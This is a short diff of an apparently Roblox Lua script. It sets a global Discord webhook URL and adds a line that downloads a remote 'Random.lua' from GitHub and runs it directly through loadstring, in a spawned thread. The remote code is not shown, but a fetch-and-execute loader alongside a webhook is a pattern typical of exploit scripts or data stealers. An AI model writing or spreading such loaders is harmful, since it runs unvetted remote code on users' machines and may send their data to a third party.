@@ -6,7 +6,7 @@ _G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun0
 
 -- Run both scripts concurrently
 spawn(function()
-    loadstring(game:HttpGet(""))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Random/refs/heads/main/Random.lua"))()
 end)
 
 spawn(function()
